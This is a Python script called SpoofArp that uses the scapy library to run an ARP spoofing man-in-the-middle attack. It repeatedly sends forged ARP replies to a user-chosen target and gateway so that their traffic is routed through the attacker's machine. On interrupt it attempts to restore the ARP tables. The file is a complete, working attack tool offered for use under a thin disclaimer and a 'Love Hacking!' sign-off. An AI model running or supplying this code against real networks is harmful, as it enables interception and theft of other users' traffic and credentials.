#!/usr/bin/python3

import scapy.all as scapy
import time 
import sys

##FUNCTIONS DEFINED:


#######################################################################################################################################################################################################################################	
def thanks():
	print("\n")
	print("#"*100)
	print("Thank you for using SpoofArp.")
	print("Love Hacking!")
	print("#"*100)
#######################################################################################################################################################################################################################################


#######################################################################################################################################################################################################################################	

#######################################################################################################################################################################################################################################

#######################################################################################################################################################################################################################################
def get_mac(ip):                              
                 arp_request = scapy.ARP(pdst=ip)    ##creates a ARP packet obeject. pdst sets destination ip.
                 #arp_request.show() ##prints more details about the packet
                 broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") ##Creates an Ethernet object. Sends packet to broadcast MAC.
                 #broadcast.show() ##prints more details about the packet
                 arp_request_broadcast = broadcast/arp_request ## Combines the 2 above packets using "/".
                 #arp_request_broadcast.show() ##prints more details about the packet.
                 #scapy.ls(class) ##prints feilds that can be set by you for a class.
                                #print(arp_request_broadcast.summary()) ##print what the packet says.
                 answered_list, unanswered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)##Send an ARP with a custom Ether.>
                 var = answered_list[0][1].hwsrc
                 return var #######################################################################################################################################################################################################################################                  #######################################################################################################################################################################################################################################     
def spoof(ip, spoof_ip):
	target_mac = get_mac(ip)
	packet = scapy.ARP(op=2, pdst=ip, hwdst=target_mac , psrc=spoof_ip)
	scapy.send(packet, verbose=False)
#######################################################################################################################################################################################################################################	
	
#######################################################################################################################################################################################################################################	
def restore(dst_ip, src_ip):
	time.sleep(0.3)
	dst_mac = get_mac(dst_ip)
	source_mac = get_mac(src_ip)
	packet = scapy.ARP(op=2, pdst=ip, hwdst=dst_mac, psrc=spoof_ip, hwsrc=source_mac) ##Carfts an ARP packet to restore the ARP tables of the 2 targets. the hwsrc is important as otherwise scapy would automatically set that as mac of Kali and we would end up spoofing the target again.  
	#print(packet.show())
	#print(packet.summary())
	print("Sending restore packet......")
	scapy.send(packet, count=4, verbose=False) ##The count=4 is just to send the packet 4 times. This is just to make sure that the target machine receives the packet we send. 
	packet = scapy.ARP(op=2, pdst=spoof_ip, hwdst=source_mac, psrc=ip, hwsrc=dst_mac)
	scapy.send(packet, count=4, verbose=False)
#######################################################################################################################################################################################################################################	

#######################################################################################################################################################################################################################################	
def loop():
	print("Preparing for broadcast....")
	time.sleep(1)
	print("Spoofing!\n")
	sent_packets = 0
	try:
		while True:
			spoof(ip, spoof_ip)
			spoof(spoof_ip, ip)
			sent_packets =  sent_packets + 2
			print("\r[+] Sent packets: " + str(sent_packets), end=' ') #end= ' ' stores the print in a buffer and \r overwrites the starting line to print the new line, giving a dynamic print statement.
			time.sleep(3)
			
	except KeyboardInterrupt:
		print("\n[-] Done!")
		time.sleep(0.5)
		print("[+] Restoring ARP tables of targets....")
		restore(ip, spoof_ip)
#######################################################################################################################################################################################################################################	

#######################################################################################################################################################################################################################################


###ACTUAL CODE:
#######################################################################################################################################################################################################################################	


print("This program spoofs MACs of different devices and allows you to become the man in the middle. You just need the IP addresses of the 2 devices.")
print("\nNote: This program requires sudo/ root privlages.")
print("\nDisclaimer: I will not be responsible for the damage caused by this program. Use of this program for malacious purposes can result in legal issues. You have been warned!!")
print("\n")
run = input("Do you wish to run the program? (Enter 'y' for yes or any other key for no): ")
if run == 'y' or run == 'Y':
	try:
		ip = input("Enter target IP: ")
		spoof_ip = input("Gateway IP to spoof: ")
		loop()
	except KeyboardInterrupt:
		print("\n[-] Cancelling..")
		time.sleep(0.2)
		thanks()
		sys.exit()	

	
else:
	print(f"'y' not detected. input = {run}. Exitting!")
	thanks()
	sys.exit()
	
time.sleep(0.5)
print("\nARP tables restored!!\n")
thanks()
sys.exit()
#######################################################################################################################################################################################################################################	

#######################################################################################################################################################################################################################################	




